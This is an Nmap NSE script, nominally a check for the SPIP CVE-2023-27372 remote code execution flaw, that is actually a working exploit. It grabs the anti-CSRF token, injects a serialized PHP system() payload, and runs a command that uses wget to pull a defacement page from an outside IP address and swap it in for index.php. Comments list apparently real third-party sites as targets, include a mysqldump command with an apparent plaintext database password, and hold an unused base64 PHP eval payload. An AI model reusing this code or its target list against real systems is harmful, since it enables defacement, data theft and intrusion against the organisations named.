local string = require "string"
local httpspider = require "httpspider"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"
local table = require "table"
local io = require "io"


description = [[
CVE-2023-27372
SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.

References:
* https://packetstormsecurity.com/files/171921/SPIP-Remote-Command-Execution.html
* https://nvd.nist.gov/vuln/detail/CVE-2023-27372
* https://github.com/nuts7/CVE-2023-27372
]]

---
-- @usage nmap -sV --script vuln <target>
-- @usage nmap -p80 --script http-vuln-cve2023-27372.nse <target>
-- target demo humpath.com
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2023-27372:
-- |   VULNERABLE:
-- |   SPIP before 4.2.1 allows Remote Code Execution
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2023-27372
-- |      SPIP before 4.2.1 allows Remote Code Execution
-- |       via form values in the public area because serialization is mishandled.
-- |
-- |     Disclosure date: 2023-06-27
-- |     References:
-- |       https://packetstormsecurity.com/files/171921/SPIP-Remote-Command-Execution.html
-- | https://nvd.nist.gov/vuln/detail/CVE-2023-27372
-- | https://github.com/nuts7/CVE-2023-27372
-- |
---

author = {"Mr Hackux", "Balgo security"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive"}

portrule = shortport.http

action = function(host, port)
 -- local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
  
  local vuln = {
    title = 'SPIP before 4.2.1 allows Remote Code Execution. ',
    state = vulns.STATE.NOT_VULN,
    description = [[
SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled.
    ]],
    IDS = {CVE = 'CVE-2023-27372'},
    references = {
      'https://packetstormsecurity.com/files/171921/SPIP-Remote-Command-Execution.html',
      'https://nvd.nist.gov/vuln/detail/CVE-2023-27372',
      'https://github.com/nuts7/CVE-2023-27372'
    },
    dates = {
      disclosure = {year = '2023', month = '06', day = '27'},
    },
 exploit_results = {},
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln.state = vulns.STATE.NOT_VULN

local opts = {header={}}
opts["header"]["User-Agent"] = 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0'
opts["header"]["Accept"] = '*/*' -- 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'


    --local target = "https://mesdemarches.agriculture.gouv.fr"

-- owens.cd
-- uml.cd
-- scipec.cd
-- fnj.cd

-- http://ferwafa.rw/
-- https://copeduplc.rw/
-- https://www.eprnrwanda.org/
-- http://www.redo.org.rw/
-- http://www.irizantakoheritage.com/
-- https://ricem.rw/
--https://legacyclinics.rw/
-- https://ghdf.org.rw/

 -- Remplacez par l'URL de base de l'application SPIP que vous souhaitez tester
    local suite1 = "<?php eval(base64_decode(\"PHN0eWxlPiAgICA8aDE+VXBsb2FkIGRlIGZpY2hpZXI8L2gxPiAgICA8Ym9keT4gICAgICAgICA8dGl0bGU+VXBsb2FkIGRlIGZpY2hpZXI8L3RpdGxlPiAgICA8L2JvZHk+ICAgIDxib2R5PiAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgcmVxdWlyZWQ9IjsgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGF0aG5vIiBuYW1lPSIiIC8+ICAgIDwvZm9ybT4KPC9ib2R5Pjwvc3R5bGU+CjwhLS0gRE9DUkVUX0hUTUw+CjxodG1sPgo8aGVhZD4KICA8dGl0bGU+VXBsb2FkIGRlIGZpY2hpZXI8L3RpdGxlPgogIDxib2R5PgogICAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im1vZHVsZS9QU0QiPgogICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgcmVxdWlyZWQ9IiIgLz4KICAgICAgICA8aW5wdXQgdHlwZT0icGF0aG5vIiBuYW1lPSJmaWxlIiByZXF1aXJlZCI+CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBjb25maWd1cmUoX19GSUxFU19fK2ZpbGVbImZpbGUiXVsnbmFtZSddKTsKICAgICAgICAgICAgZXhwb3J0ICJMZSBmaWNoaWVyIGEgZXRlIHVwbG9hZOKAmSB1cCBkbyBmaWNoaWVyLiIgKyB0YXJnZXRGaWxlOwogICAgICAgAgICAgfQogICAgICAgIDwvaW5wdXQ+CiAgICAgIDwvZm9ybT4KPC9ib2R5PjwvaHRtbD4=\"));?>"

    local command = "mv index.php index1.php;wget  http://190.0.158.209/files/2017-10/deface.html -O index.php;ls" 

--mysqldump -u iconsul1_owens -p Owens#2022 iconsul1_owens > backup.txt;cat backup.txt"
 --"echo \"<h1>SALUT ! LA VERSION DE VOTRE CMS SPIP EST VULNÉRABLE AU CVE-2023-27372 RENSEIGNÉ-VOUS ENFIN DE PATCHER SINON UN HACKEUR MALVEILLANT PEUT DÉTRUIRE VOS DONNÉES !!! <u>Mr Hackux</u></h1>\" > h.php"
-- Remplacez par la commande que vous souhaitez exécuter

    -- Définition du chemin et du contenu du fichier à écrire
    local file_path = "/sdcard/Nmap/data/spip.html"

    -- Ouverture du fichier en mode écriture
    local file = io.open(file_path, "w")

    local response = http.get(host,port,"/spip.php?page=spip_pass",opts,nil,"")
    local html = response.body

    -- Définition de la regex pour extraire la valeur de la balise input
    local regex = "<input[^>]+name='formulaire_action_args'[^>]+value='([^']+)'"
    local csrf_value = string.match(html, regex)
    -- print(csrf_value)
     -- print(html)

    if csrf_value then
        local payload = string.format("s:%d:\"<?php system('%s'); ?>\";", 20 + #command, command)
        local response = http.post(host,port,"/spip.php?page=spip_pass",opts,nil, {
            page = "spip_pass",
            formulaire_action = "oubli",
            formulaire_action_args = csrf_value,
            oubli = payload
        })
        -- print(response.status)
        if response.status == 200 then
            
            local html2 = response.body
             --print(html2)
           file:write(html2)
           file:flush()


    -- Définition de la regex pour extraire la valeur de la balise input
     local regex2 = "<input[^>]+name='oubli'[^>]+value=\"([^>]+)\""

    -- Recherche des textes dans les balises input avec la regex
    local value = string.match(html2, regex2)
    -- print(value)
    -- Vérification si des correspondances ont été trouvées
    if value then
        vuln.state = vulns.STATE.EXPLOIT
  table.insert(vuln.exploit_results,
    string.format("Command: %s", command))
  table.insert(vuln.exploit_results,
    string.format("Results: %s", value))
    return report:make_output(vuln)
    else
        table.insert(vuln.exploit_results,
    stdnse.debug1("[-]Command Not Found !"))
         return report:make_output(vuln)
    end

        -- Fermeture du fichier
       file:close()
        end
    else
        stdnse.debug1("[-] Unable to find Anti-CSRF token")
    end
end